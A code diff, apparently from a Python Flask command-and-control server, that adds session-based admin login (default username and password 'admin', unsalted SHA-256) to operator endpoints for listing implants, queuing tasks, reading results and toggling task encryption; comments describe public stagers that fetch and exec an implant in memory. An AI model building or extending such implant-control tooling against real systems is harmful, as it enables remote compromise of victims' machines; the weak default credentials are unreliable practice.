@@ -9,26 +9,36 @@
 
 import base64
 import hashlib
+import hashlib as _hl
 import hmac
 import json
 import logging as _logging
 import os
 import queue as _queue
+import secrets as _sec
 import sqlite3
 import ssl
 import threading
 import uuid
 from collections import defaultdict
 from datetime import datetime, timezone
+from functools import wraps
 
-from flask import Flask, Response, jsonify, request, send_from_directory
+from flask import Flask, Response, jsonify, request, send_from_directory, session as _flask_session
 
 # ── Silence Werkzeug request logs ─────────────────────────────────────────────
 _logging.getLogger("werkzeug").setLevel(_logging.ERROR)
 
+# ── Admin auth config ──────────────────────────────────────────────────────────
+_raw_pw = os.environ.get("ADMIN_PASSWORD", "admin")
+ADMIN_PASSWORD_HASH = _hl.sha256(_raw_pw.encode()).hexdigest()
+ADMIN_USERNAME      = os.environ.get("ADMIN_USERNAME", "admin")
+SESSION_SECRET      = os.environ.get("SESSION_SECRET", _sec.token_hex(32))
+
 # ── Flask apps ─────────────────────────────────────────────────────────────────
 app          = Flask(__name__)
 operator_app = Flask("operator", static_folder=None)
+operator_app.secret_key = SESSION_SECRET
 
 # ── Shared in-memory state ─────────────────────────────────────────────────────
 implants     = {}                   # {id: {hostname, user, os, registered, last_seen}}
@@ -341,24 +351,52 @@ def _cors(response):
 def _options(path):
     return "", 204
 
-@operator_app.before_request
-def _auth_gate():
-    """Enforce API key when OPERATOR_API_KEYS is non-empty. Stager/static paths are open."""
-    if request.method == "OPTIONS":
-        return None
-    # Stager endpoints are intentionally unauthenticated (the point is to be served publicly)
-    if request.path.startswith("/api/stage/") or not request.path.startswith("/api/"):
-        return None
-    if not OPERATOR_API_KEYS:
-        return None   # auth disabled when no keys configured
-    key = (request.headers.get("X-API-Key") or
-           request.headers.get("Authorization", "").removeprefix("Bearer ").strip())
-    if key in OPERATOR_API_KEYS:
-        return None
-    return jsonify({"error": "Unauthorized — provide valid X-API-Key header"}), 401
+def _require_auth(f):
+    """Decorator: allow through if session-authed OR valid API key (when keys configured)."""
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        # Session auth always works
+        if _flask_session.get("authed"):
+            return f(*args, **kwargs)
+        # API key auth (backward compat for automated tooling)
+        if OPERATOR_API_KEYS:
+            key = (request.headers.get("X-API-Key") or
+                   request.headers.get("Authorization", "").removeprefix("Bearer ").strip())
+            if key in OPERATOR_API_KEYS:
+                return f(*args, **kwargs)
+            return jsonify({"error": "Unauthorized"}), 401
+        # No API keys set: require session login
+        return jsonify({"error": "Unauthorized"}), 401
+    return wrapper
+
+
+# ── Login / logout / auth-status (always public) ─────────────────────────────
+
+@operator_app.route("/login", methods=["POST"])
+def op_login():
+    data = request.get_json() or {}
+    user = data.get("username", "")
+    pw   = data.get("password", "")
+    if (user == ADMIN_USERNAME and
+            _hl.sha256(pw.encode()).hexdigest() == ADMIN_PASSWORD_HASH):
+        _flask_session["authed"] = True
+        _flask_session.permanent = True
+        return jsonify({"ok": True})
+    return jsonify({"ok": False, "error": "Invalid credentials"}), 401
+
+@operator_app.route("/logout", methods=["POST"])
+def op_logout():
+    _flask_session.clear()
+    return jsonify({"ok": True})
+
+@operator_app.route("/api/auth/status")
+def op_auth_status():
+    return jsonify({"authed": bool(_flask_session.get("authed")),
+                    "username": ADMIN_USERNAME})
 
 
 @operator_app.get("/api/implants")
+@_require_auth
 def api_implants():
     out = []
     for iid, info in implants.items():
@@ -375,6 +413,7 @@ def api_implants():
 
 
 @operator_app.post("/api/task/<implant_id>")
+@_require_auth
 def api_queue_task(implant_id):
     if implant_id not in implants:
         return jsonify({"error": "unknown implant"}), 404
@@ -387,6 +426,7 @@ def api_queue_task(implant_id):
 
 
 @operator_app.get("/api/results/<implant_id>")
+@_require_auth
 def api_results(implant_id):
     if implant_id not in implants:
         return jsonify({"error": "unknown implant"}), 404
@@ -396,6 +436,7 @@ def api_results(implant_id):
 
 
 @operator_app.get("/api/results/<implant_id>/history")
+@_require_auth
 def api_results_history(implant_id):
     """Paginated full result history from SQLite (never clears the store)."""
     if implant_id not in implants:
@@ -419,6 +460,7 @@ def api_results_history(implant_id):
 
 
 @operator_app.delete("/api/task/<implant_id>/<int:task_id>")
+@_require_auth
 def api_cancel_task(implant_id, task_id):
     """Cancel a pending task that hasn't been picked up by the implant yet."""
     if implant_id not in implants:
@@ -436,6 +478,7 @@ def api_cancel_task(implant_id, task_id):
 
 
 @operator_app.get("/api/task/<implant_id>/queue")
+@_require_auth
 def api_task_queue(implant_id):
     """Return all tasks currently queued (not yet delivered) for an implant."""
     if implant_id not in implants:
@@ -444,6 +487,7 @@ def api_task_queue(implant_id):
 
 
 @operator_app.patch("/api/implants/<implant_id>")
+@_require_auth
 def api_update_implant(implant_id):
     """Update per-implant notes and/or tags."""
     if implant_id not in implants:
@@ -472,6 +516,7 @@ def api_update_implant(implant_id):
 
 
 @operator_app.get("/api/audit")
+@_require_auth
 def api_audit():
     """Last 200 audit entries, newest first."""
     with _db_lock:
@@ -489,6 +534,7 @@ def api_audit():
 
 
 @operator_app.get("/api/audit/<implant_id>")
+@_require_auth
 def api_audit_implant(implant_id):
     """Last 100 audit entries for one implant."""
     with _db_lock:
@@ -507,6 +553,7 @@ def api_audit_implant(implant_id):
 
 
 @operator_app.get("/api/stream")
+@_require_auth
 def sse_stream():
     q = _queue.Queue(maxsize=100)
     with _sse_clients_lock:
@@ -539,6 +586,7 @@ def sse_stream():
 # Serve lightweight one-liner stagers so the operator can quickly drop an implant.
 # The stager downloads implant_beacon.py and exec()s it in memory — never touches
 # disk beyond what Python's import machinery requires.
+# Stager endpoints are intentionally public (unauthenticated) — the target fetches them.
 
 @operator_app.get("/api/stage/implant")
 def stage_implant():
@@ -583,6 +631,7 @@ def stage_ps1():
 # ── Encryption toggle ─────────────────────────────────────────────────────────
 
 @operator_app.post("/api/config/encrypt")
+@_require_auth
 def api_set_encrypt():
     """Enable or disable AES-GCM task/result encryption. Body: {\"enabled\": true}"""
     global ENCRYPT_TASKS
@@ -595,6 +644,7 @@ def api_set_encrypt():
                     "crypto_available": _HAVE_CRYPTO})
 
 @operator_app.get("/api/config")
+@_require_auth
 def api_get_config():
     """Return current C2 configuration."""
     return jsonify({
